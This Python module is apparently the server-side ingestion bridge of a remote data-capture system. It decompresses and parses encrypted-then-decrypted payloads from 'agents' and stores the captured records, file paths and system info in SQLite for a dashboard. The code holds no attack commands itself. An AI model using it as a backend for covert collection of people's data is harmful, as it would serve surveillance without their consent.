"""
Server data bridge — parses received payloads into structured SQLite storage.

This is the critical piece that connects:
  Agent -> Transport -> Server /ingest -> **this bridge** -> SQLite -> Dashboard

Without this bridge, the server stores decrypted payloads as flat files
and the dashboard has no way to read them.

The bridge:
  1. Receives decrypted payload bytes from the /ingest handler
  2. Detects the format (JSON, ZIP containing records.json, gzip)
  3. Parses the records array from the payload
  4. Inserts each record into the shared SQLite database
  5. The dashboard reads from this same database

Usage::

    from server.data_bridge import DataBridge

    bridge = DataBridge("./data/captures.db")
    bridge.ingest_payload(decrypted_bytes, sender_id="agent-1")
    bridge.close()
"""
from __future__ import annotations

import gzip
import io
import json
import logging
import sqlite3
import threading
import time
import zipfile
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


class DataBridge:
    """Parses decrypted payloads into structured SQLite storage.

    Uses the same schema as ``storage.sqlite_storage.SQLiteStorage``
    so the dashboard can read from the same database.

    Parameters
    ----------
    db_path : str
        Path to the SQLite database. Should be the same path the
        dashboard is configured to read from.
    """

    def __init__(self, db_path: str = "./data/captures.db") -> None:
        self._db_path = Path(db_path)
        self._db_path.parent.mkdir(parents=True, exist_ok=True)
        self._lock = threading.Lock()
        self._conn = sqlite3.connect(str(self._db_path), check_same_thread=False)
        try:
            self._conn.execute("PRAGMA journal_mode=WAL")
            self._create_tables()
        except Exception:
            self._conn.close()
            raise
        logger.info("Data bridge initialized: %s", self._db_path)

    def _create_tables(self) -> None:
        """Create the captures table (same schema as SQLiteStorage)."""
        self._conn.executescript("""
            CREATE TABLE IF NOT EXISTS captures (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                type TEXT NOT NULL,
                data TEXT DEFAULT '',
                file_path TEXT DEFAULT '',
                file_size INTEGER DEFAULT 0,
                timestamp REAL NOT NULL,
                sent INTEGER DEFAULT 0,
                agent_id TEXT DEFAULT ''
            );
            CREATE INDEX IF NOT EXISTS idx_captures_type ON captures(type);
            CREATE INDEX IF NOT EXISTS idx_captures_ts ON captures(timestamp);
            CREATE INDEX IF NOT EXISTS idx_captures_agent ON captures(agent_id);
        """)
        self._conn.commit()

    def ingest_payload(self, payload: bytes, sender_id: str = "") -> int:
        """Parse a decrypted payload and insert records into SQLite.

        Handles multiple formats:
          - Raw JSON (``{"records": [...], "system": {...}}``)
          - ZIP containing ``records.json``
          - Gzip-compressed JSON or ZIP

        Returns the number of records inserted.
        """
        try:
            # Decompress if gzipped
            if payload[:2] == b"\x1f\x8b":
                payload = gzip.decompress(payload)

            # Extract JSON from ZIP if needed
            if payload[:4] == b"PK\x03\x04":
                payload = self._extract_from_zip(payload)

            # Parse JSON
            if not payload:
                return 0

            data = json.loads(payload)
            records = data.get("records", [])
            system_info = data.get("system", {})

            if not records:
                # Single record (non-bundled payload)
                if "type" in data:
                    records = [data]
                else:
                    return 0

            count = self._insert_records(records, sender_id, system_info)
            logger.debug("Ingested %d records from %s", count, sender_id or "unknown")
            return count

        except json.JSONDecodeError as exc:
            logger.warning("Payload is not valid JSON: %s", exc)
            # Store as raw binary capture
            return self._insert_raw(payload, sender_id)

        except Exception as exc:
            logger.warning("Failed to ingest payload: %s", exc)
            return 0

    def _extract_from_zip(self, zip_bytes: bytes) -> bytes:
        """Extract records.json from a ZIP payload."""
        try:
            with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
                # Look for records.json first
                if "records.json" in zf.namelist():
                    return zf.read("records.json")
                # Try first JSON file
                for name in zf.namelist():
                    if name.endswith(".json"):
                        return zf.read(name)
                # No JSON found -- return empty
                return b""
        except zipfile.BadZipFile:
            return b""

    def _insert_records(
        self,
        records: list[dict[str, Any]],
        sender_id: str,
        system_info: dict[str, Any],
    ) -> int:
        """Insert parsed records into SQLite."""
        count = 0
        with self._lock:
            for record in records:
                try:
                    capture_type = record.get("type", "unknown")
                    data = record.get("data", "")
                    if isinstance(data, (dict, list)):
                        data = json.dumps(data)
                    file_path = record.get("path", "") or record.get("file_path", "")
                    file_size = record.get("size", 0) or 0
                    timestamp = record.get("timestamp") or time.time()

                    self._conn.execute(
                        "INSERT INTO captures (type, data, file_path, file_size, "
                        "timestamp, sent, agent_id) VALUES (?, ?, ?, ?, ?, 1, ?)",
                        (capture_type, str(data), str(file_path), int(file_size),
                         float(timestamp), sender_id),
                    )
                    count += 1
                except Exception as exc:
                    logger.debug("Failed to insert record: %s", exc)

            if count > 0:
                try:
                    self._conn.commit()
                except Exception as exc:
                    logger.warning("Database commit failed, %d records may be lost: %s", count, exc)
                    return 0

        return count

    def _insert_raw(self, payload: bytes, sender_id: str) -> int:
        """Insert a raw non-JSON payload as a binary capture record."""
        import base64
        with self._lock:
            try:
                data_b64 = base64.b64encode(payload).decode("utf-8")
                self._conn.execute(
                    "INSERT INTO captures (type, data, file_path, file_size, "
                    "timestamp, sent, agent_id) VALUES (?, ?, ?, ?, ?, 1, ?)",
                    ("raw_payload", data_b64, "", len(payload),
                     time.time(), sender_id),
                )
                self._conn.commit()
                return 1
            except Exception:
                return 0

    def get_record_count(self) -> int:
        """Return total number of ingested records."""
        try:
            cursor = self._conn.execute("SELECT COUNT(*) FROM captures")
            return cursor.fetchone()[0]
        except Exception:
            return 0

    def close(self) -> None:
        """Close the database connection."""
        try:
            self._conn.close()
        except Exception:
            pass
